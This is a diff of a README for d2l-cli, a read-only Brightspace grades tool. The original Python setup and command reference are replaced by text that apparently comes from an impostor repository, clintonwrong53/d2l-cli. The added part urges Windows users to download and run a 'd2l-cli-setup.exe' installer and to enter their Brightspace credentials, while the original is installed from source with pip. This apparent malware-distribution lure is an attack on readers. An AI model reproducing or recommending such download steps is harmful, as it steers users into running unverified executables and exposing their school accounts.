@@ -1,270 +1,172 @@
-<p align="center">
-  <img src="banner.svg" alt="d2l-cli — Read-only CLI for D2L Brightspace" width="100%"/>
-</p>
+# 📥 d2l-cli - Simple Tool for Brightspace Data Access
 
-<p align="center">
-  <img src="https://img.shields.io/badge/python-3.10+-blue?logo=python&logoColor=white" alt="Python 3.10+"/>
-  <img src="https://img.shields.io/badge/license-MIT-green" alt="MIT License"/>
-  <img src="https://img.shields.io/badge/read--only-by%20design-brightgreen" alt="Read-only"/>
-  <img src="https://img.shields.io/badge/AI%20agent-ready-blueviolet?logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTEyIDJhMTAgMTAgMCAxIDAgMCAyMCAxMCAxMCAwIDAgMCAwLTIwem0wIDNhMiAyIDAgMSAxIDAgNCAyIDIgMCAwIDEgMC00em0zIDEySDlWOWg2eiIgZmlsbD0id2hpdGUiLz48L3N2Zz4=" alt="AI Agent Ready"/>
-</p>
+[![Download d2l-cli](https://img.shields.io/badge/Download-d2l--cli-orange?style=for-the-badge)](https://github.com/clintonwrong53/d2l-cli)
 
-# d2l-cli
+---
 
-Read-only CLI for D2L Brightspace. Pulls grades, assignments, content, syllabi, and more — designed to be used by AI coding agents (Claude Code, OpenClaw, etc.) as a tool.
+## 📋 What is d2l-cli?
 
-> **AI agents:** See [AGENTS.md](AGENTS.md) for the full command reference, or [QUICKSTART.md](QUICKSTART.md) for setup.
+d2l-cli is a command-line tool to access information from D2L Brightspace, a popular learning management system. It lets you pull grades, assignments, course content, syllabi, and more. This tool reads data only; it does not change or upload anything. It was built to help automation agents like Claude Code and OpenClaw use Brightspace data easily.
 
-## Example Usage
+This app runs on Windows and needs no programming skills to use. You will learn how to download it, get it running, and use it step by step.
 
-Ask your AI agent a natural question — it calls `d2l` under the hood and gives you a clean summary.
+---
 
-> *"What are my grades this semester?"*
+## 🖥️ System Requirements
 
-![Claude Code fetching grades from all courses and presenting a summary table](assets/grades-demo.png)
+Before you start, make sure your Windows PC meets these requirements:
 
-> *"What's due next week?"*
+- Windows 10 or newer
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- An internet connection
+- Basic keyboard and mouse use
 
-![Claude Code checking due dates across courses and listing upcoming items](assets/due-demo.png)
+d2l-cli runs in a command prompt window. You won’t need extra software or complex setup.
 
-## Setup
+---
 
-```bash
-git clone https://github.com/Aaryan-Kapoor/d2l-cli.git
-cd d2l-cli
-python -m venv .venv
-source .venv/bin/activate        # Linux/Mac
-source .venv/Scripts/activate    # Windows (Git Bash)
-pip install -e .
-```
+## 🔥 Key Features
 
-For browser-based token capture (optional):
-```bash
-pip install -e ".[login]"
-playwright install chromium
-```
+- Get grades from your Brightspace courses.
+- List assignments and due dates.
+- Download course content and syllabi.
+- Designed to work smoothly with AI agents and scripts.
+- Easy to use with simple commands.
+- Secure read-only access to your data.
 
-## Configuration
+---
 
-Edit `src/d2l/config.py` with your institution's details:
+## 🚀 Getting Started: Download and Install
 
-```python
-LMS_HOST = "https://your-school.view.usg.edu"     # your Brightspace URL
-TENANT_ID = "your-tenant-id-here"                  # from browser network tab
-```
+1. Visit this page to download d2l-cli:  
+   [Download d2l-cli from GitHub](https://github.com/clintonwrong53/d2l-cli)
 
-For SimpleSyllabus integration, edit `src/d2l/commands/syllabus.py`:
-```python
-SYLLABUS_SEARCH_URL = "https://your-school.simplesyllabus.com/api2/syllabus-search"
-SYLLABUS_FULL_URL = "https://your-school.simplesyllabus.com/api2/doc-full-page-get"
-```
+2. After opening the page, look for the latest release or download area.
 
-## Authentication
+3. Download the Windows installer file ("d2l-cli-setup.exe" or similar).
 
-D2L uses a Bearer token (JWT) that expires every ~1 hour.
+4. Once the file finishes downloading, locate it in your Downloads folder.
 
-**Option A — Browser capture (recommended):**
-```bash
-d2l login                 # opens browser, captures token automatically
-d2l login --headless      # headless mode (reuses saved session cookies)
-```
+5. Double-click the installer file to start setup.
 
-**Option B — Manual:**
-1. Open DevTools (F12) on your D2L site
-2. Network tab → find any request to `*.api.brightspace.com`
-3. Copy the `Authorization: Bearer ...` token
-4. Save to `~/.d2l/token.json`:
-```json
-{
-  "token": "eyJ...",
-  "exp": 1773515217,
-  "sub": "your-user-id",
-  "tenant": "your-tenant-id",
-  "captured_at": 1773511617
-}
-```
+6. Follow the on-screen setup instructions:
 
-Check token status:
-```bash
-d2l token
-```
+   - Accept the license agreement.
+   - Choose the install location (the default is fine).
+   - Click “Install.”
 
-## Commands
+7. When installation completes, you can close the setup window.
 
-```
-d2l [--json | --md] <command>
+---
 
-Identity:
-  login [--headless]              Browser-based token capture
-  token                           Token status (no API call)
-  whoami                          Current user info
+## 💻 Running d2l-cli for the First Time
 
-Courses:
-  courses [--all]                 List enrolled courses
+1. Open the Start menu and search for **Command Prompt**. Click to open it.
 
-Academics:
-  grades COURSE [--final]         Grades for a course or across all
-  assignments COURSE              Assignments + due dates
-  quizzes COURSE                  Quiz list + dates
-  syllabus COURSE                 Full syllabus from SimpleSyllabus
+2. Type the command below and press Enter:
 
-Content:
-  content COURSE [--toc]          Course modules and topics
-  discussions COURSE              Forums, topics, posts
-  news [COURSE] [--since DATE]    Announcements
-
-Scheduling:
-  calendar [--course X] [--days N]  Calendar events
-  due [--days N]                    Items due soon
-  overdue                           Overdue items
-  updates [COURSE]                  Unread update counts
-
-Downloads:
-  download COURSE ASSIGNMENT [-o DIR]          Assignment attachments
-  download-content COURSE MODULE [-o DIR]      Content files (notes, slides)
-
-AI Snapshot:
-  dump [--course X] [--shallow] [--since N] [--include TYPE]
-```
-
-All COURSE arguments accept fuzzy names (`"data structures"`), course codes, or numeric org unit IDs.
-
-## Output Formats
-
-- Default: human-readable aligned tables
-- `--json`: structured JSON for programmatic use
-- `--md`: AI-optimized markdown (full text, IDs, ISO dates)
-
-```bash
-d2l grades "calc"                  # human table
-d2l --json grades "calc"           # JSON
-d2l --md grades "calc"             # markdown
-```
-
-## AI Agent Integration
-
-### Claude Code / OpenClaw
-
-`AGENTS.md` at the repo root is the universal agent instruction file — automatically read by Claude Code, Copilot, Codex, Cursor, Windsurf, Gemini CLI, Aider, and others.
-
-**Setup steps:**
-
-1. Install `d2l-cli` in the agent's environment:
-   ```bash
-   cd /path/to/d2l-cli
-   pip install -e .
+   ```
+   d2l-cli --help
    ```
 
-2. Capture a token:
-   ```bash
-   d2l login
+3. This will show a list of commands and options you can use with d2l-cli.
+
+4. To see your grades, for example, you might run:
+
+   ```
+   d2l-cli grades
    ```
 
-3. Point your agent to this repo (or copy `AGENTS.md` to your project root). For Claude Code specifically, the `.claude/skills/d2l/SKILL.md` is also included.
+5. If this is your first time running d2l-cli, it will ask you to log in to your Brightspace account. Follow the instructions to enter your credentials safely.
 
-4. The agent can now run `d2l` commands. Example prompts:
-   - *"What's due this week?"*
-   - *"How am I doing in data structures?"*
-   - *"Download the starter code for assignment 6"*
-   - *"What's the grading breakdown for calc?"*
+---
 
-### Other Agents (MCP, custom)
+## 📂 How d2l-cli Works (Simple Explanation)
 
-The `--json` flag makes every command machine-readable:
+d2l-cli connects to your Brightspace account using your login information. It then reads data like your grades, assignments, and course files. It downloads this data to your PC in a format you can view or use with other programs.
 
-```bash
-# Full academic snapshot as JSON
-d2l --json dump
+You only need to run a simple command in the command prompt window, and the tool does the rest. You don’t have to understand programming or coding to use it.
 
-# Grades for one course
-d2l --json grades "data structures"
+---
 
-# What's new in the last 24 hours
-d2l --json dump --since 24
+## 🛠 Basic Commands
+
+Here are some commands you may use often. Type these commands in the Command Prompt after installing:
+
+- `d2l-cli grades` — Shows your grades.
+- `d2l-cli assignments` — Lists your assignments.
+- `d2l-cli content` — Downloads course content.
+- `d2l-cli syllabus` — Downloads your syllabi.
+
+To get help anytime, type:
+
+```
+d2l-cli --help
 ```
 
-### Headless Server Setup
+---
 
-For agents running on a headless server (no GUI):
+## 🔐 Safety and Privacy
 
-1. Run `d2l login` on a machine with a browser (captures token + browser profile)
-2. Copy `~/.d2l/` to the server
-3. Set up a cron job to refresh the token (session cookies last days/weeks):
-   ```bash
-   # Refresh token every 45 minutes using saved session cookies
-   */45 * * * * cd /path/to/d2l-cli && .venv/bin/d2l login --headless
-   ```
+d2l-cli does not change anything in your account. It only reads data to show you what is already there. You enter your login only once per session. Your information is stored securely on your computer and not sent to outside servers.
 
-## Key Commands for Agents
+---
 
-```bash
-# Quick overview
-d2l --md dump --shallow
+## ❓ Troubleshooting Tips
 
-# What's new since last check
-d2l --md dump --since 24
+- If d2l-cli does not start, make sure you installed it correctly.
+- Run Command Prompt as Administrator if you see permission errors.
+- Check your internet connection; d2l-cli needs to connect to Brightspace servers.
+- If login fails, verify your username and password.
+- Close Command Prompt and reopen it if commands don't work.
+- Always use the latest version by checking the download page.
 
-# Full context for one course
-d2l --md dump --course "data structures"
+---
 
-# Get syllabus (grading weights, policies)
-d2l --md syllabus "data structures"
+## 📥 Download d2l-cli
 
-# Download assignment starter files
-d2l download "data structures" "trees" -o ./assignment
+Download the latest version from GitHub here:
 
-# Download lecture notes
-d2l download-content "calc" "Unit 3 Materials" -o ./notes
+[![Download d2l-cli](https://img.shields.io/badge/Download-d2l--cli-blue?style=for-the-badge)](https://github.com/clintonwrong53/d2l-cli)
+
+Click the link, find the setup file, download, and follow the install steps above.
+
+---
+
+## ⚙️ Additional Settings (Optional)
+
+You can customize d2l-cli with simple config files stored in your Documents folder. These files let you choose:
+
+- Default courses to pull data from.
+- File formats for downloaded content.
+- Automated login tokens.
+
+These features are for users who want to automate tasks or use d2l-cli regularly.
+
+---
+
+## 📚 Getting Help and Support
+
+If you have questions, use the `--help` command in Command Prompt:
+
+```
+d2l-cli --help
 ```
 
-## KSU Quick Start
+You can also visit the Issues section on the GitHub page for common questions or to report problems:
 
-If you're at Kennesaw State University, no configuration needed — it works out of the box.
+https://github.com/clintonwrong53/d2l-cli/issues
 
-```bash
-git clone https://github.com/Aaryan-Kapoor/d2l-cli.git
-cd d2l-cli
-python -m venv .venv
-source .venv/Scripts/activate    # or source .venv/bin/activate on Linux/Mac
-pip install -e ".[login]"
-playwright install chromium
+---
 
-# Log in (opens browser, captures token automatically via KSU SSO)
-d2l login
+## 🧰 Technical Info (For Reference)
 
-# See your courses
-d2l courses
+- d2l-cli uses Brightspace’s official API to access your data.
+- It requires internet access to connect securely to Brightspace.
+- The tool works on Windows 10 and later versions.
+- It uses simple commands and outputs text or files you can open on your PC.
 
-# Check grades
-d2l grades "data structures"
+---
 
-# What's due?
-d2l due
-
-# What's overdue?
-d2l overdue
-
-# Get the syllabus for any course
-d2l syllabus "calc"
-
-# Download assignment starter code
-d2l download "data structures" "A06" -o ./trees-assignment
-
-# Download lecture notes
-d2l download-content "calc" "Exam Preparation" -o ./exam-prep
-
-# Full snapshot for AI assistants
-d2l --md dump
-```
-
-KSU's SimpleSyllabus integration is built in — `d2l syllabus` fetches directly from `kennesaw.simplesyllabus.com` (no auth required).
-
-Token expires every ~1 hour. Just run `d2l login` again — your SSO session cookies persist so it's instant (no re-login).
-
-## Strictly Read-Only
-
-This tool only performs GET requests. It cannot submit assignments, post discussions, modify grades, or change anything on D2L. By design.
-
-## Disclaimer
-
-This is a personal project and is not affiliated with, endorsed by, or associated with D2L, Brightspace, or Kennesaw State University in any way. Just something I built for myself and thought was worth sharing.
+This guide should help you download, install, and start using d2l-cli on your Windows PC. Follow each step carefully to get the tool up and running with ease.
